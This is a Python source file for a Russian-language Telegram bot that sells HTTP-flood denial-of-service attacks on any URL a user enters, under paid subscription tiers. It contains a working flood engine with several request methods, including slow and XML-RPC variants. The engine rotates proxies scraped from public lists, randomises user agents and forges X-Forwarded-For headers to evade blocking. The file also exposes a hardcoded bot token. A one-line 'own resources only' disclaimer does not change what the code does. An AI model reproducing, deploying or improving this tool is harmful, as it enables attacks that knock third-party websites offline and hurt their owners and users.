#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
DIMSTAT BOT — HTTP-ФЛУД с FSM
"""

import asyncio
import os
import sys
import json
import time
import random
import html
from datetime import datetime, timedelta
from typing import Dict, List

import aiohttp
import requests
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command, StateFilter
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, InputFile
from aiogram import F
from aiohttp import web

# ==============================
# КОНФИГУРАЦИЯ
# ==============================
BOT_TOKEN = "8984259381:AAHAc-dorORjD-G0Ci2lLnwf_kbbzqqCxkg"
ADMINS = [8264264137]

PROXIES_FILE = "proxies.txt"
DATA_FILE = "users.json"
UA_FILE = "user_agents.txt"

WEBHOOK_URL = "https://llosdfisojdfouisdf-production.up.railway.app/webhook"

# ==============================
# FSM СОСТОЯНИЯ
# ==============================
class AttackStates(StatesGroup):
    choosing_method = State()
    waiting_url = State()
    waiting_threads = State()
    waiting_duration = State()
    confirming = State()

# ==============================
# ГЛОБАЛЬНЫЕ ОБЪЕКТЫ
# ==============================
storage = MemoryStorage()
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(storage=storage)
user_data_cache = {}  # временное хранилище параметров

# ==============================
# ТАРИФЫ И ДАННЫЕ
# ==============================
TIERS = {
    "free": {"name": "🐢 Бесплатный", "max_threads": 100, "max_duration": 60},
    "medium": {"name": "⚡ Средний", "max_threads": 500, "max_duration": 600},
    "pro": {"name": "💥 Мощный", "max_threads": 3000, "max_duration": 3600}
}

def load_users():
    if os.path.exists(DATA_FILE):
        with open(DATA_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    return {}

def save_users(users):
    with open(DATA_FILE, "w", encoding="utf-8") as f:
        json.dump(users, f, indent=2, ensure_ascii=False)

def get_user(user_id):
    users = load_users()
    uid = str(user_id)
    if uid not in users:
        users[uid] = {"balance": 0, "tier": "free", "expiry": None}
        save_users(users)
    return users[uid]

def set_user_tier(user_id, tier):
    users = load_users()
    uid = str(user_id)
    if uid not in users:
        users[uid] = {"balance": 0, "tier": "free", "expiry": None}
    users[uid]["tier"] = tier
    if tier != "free":
        users[uid]["expiry"] = (datetime.now() + timedelta(days=30)).isoformat()
    else:
        users[uid]["expiry"] = None
    save_users(users)

def is_admin(user_id):
    return user_id in ADMINS

# ==============================
# USER-AGENT
# ==============================
try:
    from fake_useragent import UserAgent
    UA_AVAILABLE = True
except:
    UA_AVAILABLE = False

def get_user_agents() -> List[str]:
    if os.path.exists(UA_FILE):
        with open(UA_FILE, "r", encoding="utf-8") as f:
            ua = [line.strip() for line in f if line.strip()]
            if len(ua) > 10:
                return ua
    base = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    ]
    if UA_AVAILABLE:
        try:
            ua = UserAgent()
            for _ in range(100):
                base.append(ua.random)
        except:
            pass
    final = list(set(base))
    with open(UA_FILE, "w", encoding="utf-8") as f:
        f.write("\n".join(final))
    return final

USER_AGENTS = get_user_agents()

def get_random_ua():
    return random.choice(USER_AGENTS) if USER_AGENTS else "Mozilla/5.0"

# ==============================
# ПРОКСИ
# ==============================
PROXY_SOURCES = [
    "https://raw.githubusercontent.com/Thordata/awesome-free-proxy-list/main/proxies/http.txt",
    "https://raw.githubusercontent.com/Thordata/awesome-free-proxy-list/main/proxies/https.txt",
    "https://raw.githubusercontent.com/Thordata/awesome-free-proxy-list/main/proxies/socks4.txt",
    "https://raw.githubusercontent.com/Thordata/awesome-free-proxy-list/main/proxies/socks5.txt",
    "https://raw.githubusercontent.com/fyvri/fresh-proxy-list/main/output/http.txt",
    "https://raw.githubusercontent.com/fyvri/fresh-proxy-list/main/output/https.txt",
]

def fetch_proxies():
    all_proxies = []
    seen = set()
    for url in PROXY_SOURCES:
        try:
            r = requests.get(url, timeout=10)
            if r.status_code == 200:
                for line in r.text.splitlines():
                    line = line.strip()
                    if line and not line.startswith('#') and ':' in line:
                        if line not in seen:
                            seen.add(line)
                            all_proxies.append(line)
        except:
            pass
    return all_proxies

def validate_proxies(proxy_list):
    valid = []
    for proxy in proxy_list[:50]:
        try:
            r = requests.get("http://httpbin.org/ip", proxies={"http": proxy, "https": proxy}, timeout=3)
            if r.status_code == 200:
                valid.append(proxy)
        except:
            pass
    return valid

def update_proxies():
    raw = fetch_proxies()
    if raw:
        valid = validate_proxies(raw)
        if valid:
            with open(PROXIES_FILE, "w") as f:
                f.write("\n".join(valid))
            return len(valid)
    return 0

def load_proxies():
    if os.path.exists(PROXIES_FILE):
        with open(PROXIES_FILE, "r") as f:
            return [line.strip() for line in f if line.strip()]
    return []

# ==============================
# АТАКА (HTTP-ФЛУД)
# ==============================
active_attacks = {}

async def run_http_attack(user_id: int, method: str, url: str, threads: int, duration: int):
    proxies = load_proxies()
    if not proxies:
        proxies = [None]

    headers = {
        "User-Agent": get_random_ua(),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
    }

    xml_payload = """<?xml version="1.0"?>
<methodCall>
    <methodName>system.listMethods</methodName>
    <params></params>
</methodCall>"""

    extra_headers = {
        "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
        "Referer": "https://www.google.com/",
        "Cache-Control": "no-cache",
        "Pragma": "no-cache",
        "DNT": "1",
    }

    sem = asyncio.Semaphore(threads)
    counter = 0
    start_time = time.time()
    end_time = start_time + duration

    async def make_request(session, proxy):
        nonlocal counter
        if time.time() > end_time:
            return
        try:
            async with sem:
                timeout = aiohttp.ClientTimeout(total=30 if method == "SLOW" else 5)
                h = headers.copy()
                if method == "APACHE":
                    h.update(extra_headers)
                    h[f"X-Custom-{random.randint(1000,9999)}"] = str(random.randint(1000,9999))

                proxy_url = f"http://{proxy}" if proxy else None
                data = None
                if method == "POST":
                    data = {"key": "value", "random": random.randint(1,1000)}
                elif method == "XMLRPC":
                    data = xml_payload
                    h["Content-Type"] = "text/xml"

                async with session.request(
                    method=method if method not in ["SLOW", "APACHE", "XMLRPC"] else "GET",
                    url=url,
                    headers=h,
                    data=data,
                    timeout=timeout,
                    proxy=proxy_url,
                    ssl=False,
                ) as resp:
                    if method != "SLOW":
                        await resp.read()
                counter += 1
        except:
            pass

    connector = aiohttp.TCPConnector(limit=0, ttl_dns_cache=300)
    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = []
        while time.time() < end_time:
            proxy = random.choice(proxies) if proxies[0] is not None else None
            task = asyncio.create_task(make_request(session, proxy))
            tasks.append(task)
            await asyncio.sleep(0.01)
        await asyncio.gather(*tasks, return_exceptions=True)

    elapsed = time.time() - start_time
    return counter, elapsed

async def run_attack_wrapper(user_id, method, url, threads, duration):
    try:
        counter, elapsed = await run_http_attack(user_id, method, url, threads, duration)
        return f"Атака завершена. Отправлено ~{counter} запросов за {elapsed:.2f} сек."
    except Exception as e:
        return f"Ошибка: {e}"

# ==============================
# КЛАВИАТУРЫ
# ==============================
def main_menu():
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="🚀 Запустить атаку", callback_data="attack_start"),
            InlineKeyboardButton(text="⏹️ Остановить атаку", callback_data="attack_stop")
        ],
        [
            InlineKeyboardButton(text="📊 Статус", callback_data="status"),
            InlineKeyboardButton(text="💡 Помощь", callback_data="help")
        ],
        [
            InlineKeyboardButton(text="💎 Купить подписку", callback_data="buy_tier"),
            InlineKeyboardButton(text="👤 Мой тариф", callback_data="my_tier")
        ],
        [
            InlineKeyboardButton(text="👑 Админ-панель", callback_data="admin_panel")
        ]
    ])

def admin_menu():
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="📊 Статистика", callback_data="admin_stats"),
            InlineKeyboardButton(text="💎 Выдать подписку", callback_data="admin_give")
        ],
        [
            InlineKeyboardButton(text="🔄 Обновить прокси", callback_data="admin_update_proxies"),
            InlineKeyboardButton(text="⬅️ Назад", callback_data="back_main")
        ]
    ])

def buy_tier_menu():
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="🐢 Бесплатный", callback_data="tier_free"),
            InlineKeyboardButton(text="⚡ Средний (400 ₽)", callback_data="tier_medium")
        ],
        [
            InlineKeyboardButton(text="💥 Мощный (799 ₽)", callback_data="tier_pro"),
            InlineKeyboardButton(text="⬅️ Назад", callback_data="back_main")
        ]
    ])

def method_menu():
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="🌐 GET", callback_data="m_GET"),
            InlineKeyboardButton(text="📨 POST", callback_data="m_POST")
        ],
        [
            InlineKeyboardButton(text="🔹 HEAD", callback_data="m_HEAD"),
            InlineKeyboardButton(text="🐢 SLOW", callback_data="m_SLOW")
        ],
        [
            InlineKeyboardButton(text="🔧 APACHE", callback_data="m_APACHE"),
            InlineKeyboardButton(text="📦 XMLRPC", callback_data="m_XMLRPC")
        ],
        [
            InlineKeyboardButton(text="⬅️ Назад", callback_data="back_main")
        ]
    ])

def threads_menu():
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="50", callback_data="t_50"),
            InlineKeyboardButton(text="100", callback_data="t_100")
        ],
        [
            InlineKeyboardButton(text="200", callback_data="t_200"),
            InlineKeyboardButton(text="500", callback_data="t_500")
        ],
        [
            InlineKeyboardButton(text="1000", callback_data="t_1000"),
            InlineKeyboardButton(text="2000", callback_data="t_2000")
        ],
        [
            InlineKeyboardButton(text="🔢 Своё", callback_data="t_custom"),
            InlineKeyboardButton(text="⬅️ Назад", callback_data="back_main")
        ]
    ])

def duration_menu():
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="⏱️ 30 сек", callback_data="d_30"),
            InlineKeyboardButton(text="⏱️ 60 сек", callback_data="d_60")
        ],
        [
            InlineKeyboardButton(text="⏱️ 120 сек", callback_data="d_120"),
            InlineKeyboardButton(text="⏱️ 300 сек", callback_data="d_300")
        ],
        [
            InlineKeyboardButton(text="⏱️ 600 сек", callback_data="d_600"),
            InlineKeyboardButton(text="🔢 Своё", callback_data="d_custom")
        ],
        [
            InlineKeyboardButton(text="⬅️ Назад", callback_data="back_main")
        ]
    ])

def confirm_menu():
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="✅ Запустить", callback_data="confirm_launch"),
            InlineKeyboardButton(text="❌ Отмена", callback_data="back_main")
        ]
    ])

# ==============================
# ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ
# ==============================
async def safe_answer(callback, text=None, show_alert=False):
    try:
        await callback.answer(text, show_alert=show_alert)
    except:
        pass

async def send_new(message, text, parse_mode="HTML", reply_markup=None):
    try:
        await message.answer(text, parse_mode=parse_mode, reply_markup=reply_markup)
    except:
        pass

def generate_report(method, url, threads, duration, elapsed, output):
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    return f"""
═══════════════════════════════════════════════
          ОТЧЁТ ОБ АТАКЕ
═══════════════════════════════════════════════
  Дата и время: {now}
  Метод: {method}
  Цель: {url}
  Потоков: {threads}
  Длительность: {duration} сек
  Время выполнения: {elapsed:.2f} сек
───────────────────────────────────────────────
  РЕЗУЛЬТАТ:
{output}
═══════════════════════════════════════════════
"""

# ==============================
# ОБРАБОТЧИКИ КОМАНД И CALLBACK
# ==============================
@dp.message(Command("start"))
async def start_cmd(message: types.Message):
    user = get_user(message.from_user.id)
    tier_name = TIERS[user["tier"]]["name"]
    await message.answer(
        f"🌟 <b>DIMSTAT HTTP-ФЛУД БОТ</b>\n\n"
        f"👤 Тариф: {tier_name}\n"
        f"💎 Баланс: {user['balance']} ⭐\n\n"
        f"🚀 Управляй атаками через кнопки.",
        parse_mode="HTML",
        reply_markup=main_menu()
    )

@dp.callback_query(F.data == "back_main")
async def back_main(callback: types.CallbackQuery, state: FSMContext):
    await safe_answer(callback)
    await state.clear()
    await send_new(callback.message, "🌟 Главное меню", reply_markup=main_menu())

@dp.callback_query(F.data == "help")
async def help_cmd(callback: types.CallbackQuery):
    await safe_answer(callback)
    await send_new(
        callback.message,
        "📖 <b>Помощь</b>\n\n"
        "🚀 Запустить атаку — выбери метод, затем следуй инструкциям.\n"
        "⏹️ Остановить атаку.\n"
        "📊 Статус.\n\n"
        "⚠️ Используй только на своих ресурсах!",
        reply_markup=main_menu()
    )

@dp.callback_query(F.data == "status")
async def status_cmd(callback: types.CallbackQuery):
    await safe_answer(callback)
    user_id = callback.from_user.id
    if user_id in active_attacks:
        data = active_attacks[user_id]
        elapsed = time.time() - data["start_time"]
        remaining = max(0, data["duration"] - elapsed)
        await send_new(
            callback.message,
            f"🏃 <b>Атака выполняется</b>\n\n"
            f"⏱️ Общее время: {data['duration']} сек\n"
            f"⏳ Прошло: {int(elapsed)} сек\n"
            f"⏳ Осталось: {int(remaining)} сек\n"
            f"📌 Метод: {html.escape(data['method'])}\n"
            f"🎯 {html.escape(data['url'])}",
            reply_markup=main_menu()
        )
    else:
        await send_new(callback.message, "✅ Активных атак нет.", reply_markup=main_menu())

@dp.callback_query(F.data == "buy_tier")
async def buy_tier(callback: types.CallbackQuery):
    await safe_answer(callback)
    await send_new(
        callback.message,
        "💎 <b>Купить подписку</b>\n\n"
        "Выбери тариф. Для оплаты напиши @pasybos.",
        reply_markup=buy_tier_menu()
    )

@dp.callback_query(F.data.startswith("tier_"))
async def tier_select(callback: types.CallbackQuery):
    await safe_answer(callback)
    tier = callback.data.split("_")[1]
    user_id = callback.from_user.id
    if tier == "free":
        set_user_tier(user_id, "free")
        await send_new(callback.message, "🐢 Бесплатный тариф активирован!", reply_markup=main_menu())
    else:
        price = 400 if tier == "medium" else 799
        await send_new(
            callback.message,
            f"💎 Вы выбрали {TIERS[tier]['name']} — {price} ₽\n\n"
            f"Напиши @pasybos для оплаты.",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="📩 Написать @pasybos", url="https://t.me/pasybos")],
                [InlineKeyboardButton(text="⬅️ Назад", callback_data="back_main")]
            ])
        )

@dp.callback_query(F.data == "my_tier")
async def my_tier(callback: types.CallbackQuery):
    await safe_answer(callback)
    user = get_user(callback.from_user.id)
    tier = user["tier"]
    tier_info = TIERS[tier]
    expiry = user.get("expiry")
    if expiry:
        exp_date = datetime.fromisoformat(expiry)
        days_left = (exp_date - datetime.now()).days
        expiry_text = f"Действует до {exp_date.strftime('%d.%m.%Y')} (осталось {days_left} дн.)"
    else:
        expiry_text = "Без ограничений" if tier == "free" else "Не активна"
    await send_new(
        callback.message,
        f"👤 <b>Твой тариф</b>\n\n"
        f"📌 {tier_info['name']}\n"
        f"🧵 Макс. потоков: {tier_info['max_threads']}\n"
        f"⏱️ Макс. длительность: {tier_info['max_duration']} сек\n"
        f"📅 {expiry_text}",
        reply_markup=main_menu()
    )

@dp.callback_query(F.data == "attack_start")
async def attack_start(callback: types.CallbackQuery, state: FSMContext):
    await safe_answer(callback)
    user_id = callback.from_user.id
    if user_id in active_attacks:
        await safe_answer(callback, "⚠️ Уже есть активная атака!", show_alert=True)
        return
    await state.set_state(AttackStates.choosing_method)
    await send_new(callback.message, "🎯 Выберите метод:", reply_markup=method_menu())

@dp.callback_query(F.data.startswith("m_"))
async def method_choose(callback: types.CallbackQuery, state: FSMContext):
    await safe_answer(callback)
    method = callback.data.split("_")[1]
    await state.update_data(method=method)
    await state.set_state(AttackStates.waiting_url)
    await send_new(callback.message, f"✅ Метод: {method}\n\nВведите URL (например, example.com):", reply_markup=None)

@dp.message(AttackStates.waiting_url)
async def process_url(message: types.Message, state: FSMContext):
    url = message.text.strip()
    if not url:
        await message.answer("❌ Введите URL.")
        return
    if not url.startswith("http"):
        url = "https://" + url
    await state.update_data(url=url)
    await state.set_state(AttackStates.waiting_threads)
    await message.answer(f"✅ URL: {url}\n\nВыберите потоки:", reply_markup=threads_menu())

@dp.callback_query(F.data.startswith("t_"), StateFilter(AttackStates.waiting_threads))
async def threads_choose_callback(callback: types.CallbackQuery, state: FSMContext):
    await safe_answer(callback)
    user_id = callback.from_user.id
    val = callback.data.split("_")[1]
    if val == "custom":
        await send_new(callback.message, "🔢 Введите количество потоков:", reply_markup=None)
        # Не меняем состояние, остаёмся в waiting_threads, но обработаем текст
        return
    threads = int(val)
    tier = get_user(user_id)["tier"]
    max_thr = TIERS[tier]["max_threads"]
    if threads > max_thr:
        await safe_answer(callback, f"⚠️ Твой тариф разрешает до {max_thr} потоков!", show_alert=True)
        return
    await state.update_data(threads=threads)
    await state.set_state(AttackStates.waiting_duration)
    await send_new(callback.message, f"🧵 Потоки: {threads}\n\nВыберите длительность:", reply_markup=duration_menu())

@dp.message(AttackStates.waiting_threads)
async def process_threads_text(message: types.Message, state: FSMContext):
    # Если пользователь ввел число вручную
    try:
        threads = int(message.text.strip())
    except ValueError:
        await message.answer("❌ Введите число.")
        return
    user_id = message.from_user.id
    tier = get_user(user_id)["tier"]
    max_thr = TIERS[tier]["max_threads"]
    if threads < 1 or threads > max_thr:
        await message.answer(f"❌ Твой тариф разрешает до {max_thr} потоков.")
        return
    await state.update_data(threads=threads)
    await state.set_state(AttackStates.waiting_duration)
    await message.answer(f"🧵 Потоки: {threads}\n\nВыберите длительность:", reply_markup=duration_menu())

@dp.callback_query(F.data.startswith("d_"), StateFilter(AttackStates.waiting_duration))
async def duration_choose_callback(callback: types.CallbackQuery, state: FSMContext):
    await safe_answer(callback)
    user_id = callback.from_user.id
    val = callback.data.split("_")[1]
    if val == "custom":
        await send_new(callback.message, "⏱️ Введите длительность (сек):", reply_markup=None)
        return
    duration = int(val)
    tier = get_user(user_id)["tier"]
    max_dur = TIERS[tier]["max_duration"]
    if duration > max_dur:
        await safe_answer(callback, f"⚠️ Твой тариф разрешает до {max_dur} сек!", show_alert=True)
        return
    await state.update_data(duration=duration)
    await state.set_state(AttackStates.confirming)
    data = await state.get_data()
    method = data["method"]
    url = data["url"]
    threads = data["threads"]
    await send_new(
        callback.message,
        f"📋 <b>Проверьте параметры</b>\n\n"
        f"🎯 Метод: {method}\n"
        f"🌐 URL: {html.escape(url)}\n"
        f"🧵 Потоки: {threads}\n"
        f"⏱️ Длительность: {duration} сек\n\n"
        f"🔄 Загружаю прокси... (это может занять несколько секунд)\n\n"
        f"Запускаем?",
        parse_mode="HTML",
        reply_markup=confirm_menu()
    )

@dp.message(AttackStates.waiting_duration)
async def process_duration_text(message: types.Message, state: FSMContext):
    try:
        duration = int(message.text.strip())
    except ValueError:
        await message.answer("❌ Введите число.")
        return
    user_id = message.from_user.id
    tier = get_user(user_id)["tier"]
    max_dur = TIERS[tier]["max_duration"]
    if duration < 1 or duration > max_dur:
        await message.answer(f"❌ Твой тариф разрешает до {max_dur} сек.")
        return
    await state.update_data(duration=duration)
    await state.set_state(AttackStates.confirming)
    data = await state.get_data()
    method = data["method"]
    url = data["url"]
    threads = data["threads"]
    await message.answer(
        f"📋 <b>Проверьте параметры</b>\n\n"
        f"🎯 Метод: {method}\n"
        f"🌐 URL: {html.escape(url)}\n"
        f"🧵 Потоки: {threads}\n"
        f"⏱️ Длительность: {duration} сек\n\n"
        f"🔄 Загружаю прокси... (это может занять несколько секунд)\n\n"
        f"Запускаем?",
        parse_mode="HTML",
        reply_markup=confirm_menu()
    )

@dp.callback_query(F.data == "confirm_launch", StateFilter(AttackStates.confirming))
async def confirm_launch(callback: types.CallbackQuery, state: FSMContext):
    await safe_answer(callback)
    data = await state.get_data()
    method = data.get("method")
    url = data.get("url")
    threads = data.get("threads")
    duration = data.get("duration")
    if not all([method, url, threads, duration]):
        await send_new(callback.message, "❌ Ошибка: не хватает данных. Начните заново.", reply_markup=main_menu())
        await state.clear()
        return
    user_id = callback.from_user.id
    tier = get_user(user_id)["tier"]
    if threads > TIERS[tier]["max_threads"] or duration > TIERS[tier]["max_duration"]:
        await send_new(
            callback.message,
            f"⚠️ Твой тариф не позволяет такие параметры!\n"
            f"Макс. потоки: {TIERS[tier]['max_threads']}, макс. время: {TIERS[tier]['max_duration']} сек.",
            reply_markup=main_menu()
        )
        await state.clear()
        return

    # Обновляем прокси
    update_proxies()

    # Отправляем сообщение о начале
    msg = await callback.message.answer(
        f"🚀 <b>Атака запускается...</b>\n\n"
        f"🎯 Метод: {method}\n"
        f"🌐 URL: {html.escape(url)}\n"
        f"🧵 Потоков: {threads}\n"
        f"⏱️ Длительность: {duration} сек",
        parse_mode="HTML",
        reply_markup=main_menu()
    )

    # Запускаем атаку в фоне
    active_attacks[user_id] = {
        "start_time": time.time(),
        "duration": duration,
        "method": method,
        "url": url,
        "threads": threads,
        "msg": msg
    }

    asyncio.create_task(monitor_attack(user_id, msg))
    await state.clear()

async def monitor_attack(user_id, msg):
    data = active_attacks.get(user_id)
    if not data:
        return
    method = data["method"]
    url = data["url"]
    threads = data["threads"]
    duration = data["duration"]

    result = await run_attack_wrapper(user_id, method, url, threads, duration)

    if user_id in active_attacks:
        del active_attacks[user_id]

    elapsed = time.time() - data["start_time"]
    report_text = generate_report(method, url, threads, duration, elapsed, result)

    try:
        await msg.edit_text(
            f"✅ <b>Атака завершена!</b>\n\n"
            f"📄 <b>Отчёт:</b>\n"
            f"<code>{html.escape(report_text)}</code>",
            parse_mode="HTML",
            reply_markup=main_menu()
        )
    except:
        await bot.send_message(
            chat_id=user_id,
            text=f"✅ Атака завершена!\n\n{report_text}",
            reply_markup=main_menu()
        )

@dp.callback_query(F.data == "attack_stop")
async def stop_attack_cmd(callback: types.CallbackQuery):
    await safe_answer(callback)
    user_id = callback.from_user.id
    if user_id in active_attacks:
        del active_attacks[user_id]
        await send_new(callback.message, "🛑 Атака остановлена.", reply_markup=main_menu())
    else:
        await send_new(callback.message, "❌ Нет активной атаки.", reply_markup=main_menu())

@dp.callback_query(F.data == "admin_panel")
async def admin_panel(callback: types.CallbackQuery):
    await safe_answer(callback)
    if not is_admin(callback.from_user.id):
        await safe_answer(callback, "⛔ Нет прав!", show_alert=True)
        return
    await send_new(callback.message, "👑 Админ-панель", reply_markup=admin_menu())

@dp.callback_query(F.data == "admin_stats")
async def admin_stats(callback: types.CallbackQuery):
    await safe_answer(callback)
    if not is_admin(callback.from_user.id):
        return
    users = load_users()
    total = len(users)
    stars = sum(u.get("balance", 0) for u in users.values())
    attacks = len(active_attacks)
    tiers = {"free": 0, "medium": 0, "pro": 0}
    for u in users.values():
        tiers[u.get("tier", "free")] += 1
    proxy_count = 0
    if os.path.exists(PROXIES_FILE):
        with open(PROXIES_FILE, "r") as f:
            proxy_count = len([l for l in f if l.strip()])
    await send_new(
        callback.message,
        f"📊 <b>Статистика</b>\n\n"
        f"👥 Пользователей: {total}\n"
        f"⭐ Звёзд: {stars}\n"
        f"⚡ Активных атак: {attacks}\n"
        f"🔄 Прокси: {proxy_count}\n"
        f"🌐 User-Agent: {len(USER_AGENTS)}\n\n"
        f"📌 Тарифы:\n"
        f"🐢 Бесплатных: {tiers['free']}\n"
        f"⚡ Средних: {tiers['medium']}\n"
        f"💥 Мощных: {tiers['pro']}",
        reply_markup=admin_menu()
    )

@dp.callback_query(F.data == "admin_update_proxies")
async def admin_update_proxies(callback: types.CallbackQuery):
    await safe_answer(callback)
    if not is_admin(callback.from_user.id):
        return
    await send_new(callback.message, "🔄 Обновляю прокси...", reply_markup=None)
    count = update_proxies()
    if count > 0:
        await send_new(callback.message, f"✅ Прокси обновлены! Загружено {count} рабочих.", reply_markup=admin_menu())
    else:
        await send_new(callback.message, "❌ Не удалось обновить прокси.", reply_markup=admin_menu())

@dp.callback_query(F.data == "admin_give")
async def admin_give(callback: types.CallbackQuery, state: FSMContext):
    await safe_answer(callback)
    if not is_admin(callback.from_user.id):
        return
    await state.set_state("give_tier")  # используем простое состояние
    await send_new(
        callback.message,
        "💎 <b>Выдать подписку</b>\n\n"
        "Отправьте: <code>ID ТАРИФ</code>\n"
        "Например: <code>123456789 pro</code>\n\n"
        "Тарифы: free, medium, pro",
        parse_mode="HTML",
        reply_markup=admin_menu()
    )

@dp.message(StateFilter("give_tier"))
async def process_give_tier(message: types.Message, state: FSMContext):
    parts = message.text.strip().split()
    if len(parts) != 2:
        await message.answer("❌ Формат: ID ТАРИФ\nНапример: 123456789 pro")
        return
    target_id_str, tier = parts
    if not target_id_str.isdigit():
        await message.answer("❌ ID должен быть числом.")
        return
    target_id = int(target_id_str)
    if tier not in TIERS:
        await message.answer("❌ Доступные тарифы: free, medium, pro")
        return
    set_user_tier(target_id, tier)
    await message.answer(f"✅ Пользователю {target_id} назначен {TIERS[tier]['name']}")
    try:
        await bot.send_message(target_id, f"🎉 Вам назначен тариф {TIERS[tier]['name']}!")
    except:
        pass
    await state.clear()

# ==============================
# ВЕБХУК-СЕРВЕР
# ==============================
async def handle_webhook(request):
    try:
        update_data = await request.json()
        update = types.Update(**update_data)
        await dp.feed_update(bot, update)
        return web.Response(text="OK")
    except Exception as e:
        print(f"Webhook error: {e}")
        return web.Response(status=500)

async def on_startup():
    await bot.delete_webhook()
    await bot.set_webhook(WEBHOOK_URL)
    print(f"✅ Вебхук установлен на {WEBHOOK_URL}")

async def main():
    await on_startup()
    print("✅ Бот запущен через вебхук")
    app = web.Application()
    app.router.add_post("/webhook", handle_webhook)
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, host="0.0.0.0", port=int(os.getenv("PORT", 8080)))
    await site.start()
    print("🚀 Сервер запущен на порту", int(os.getenv("PORT", 8080)))
    while True:
        await asyncio.sleep(3600)

if __name__ == "__main__":
    asyncio.run(main())
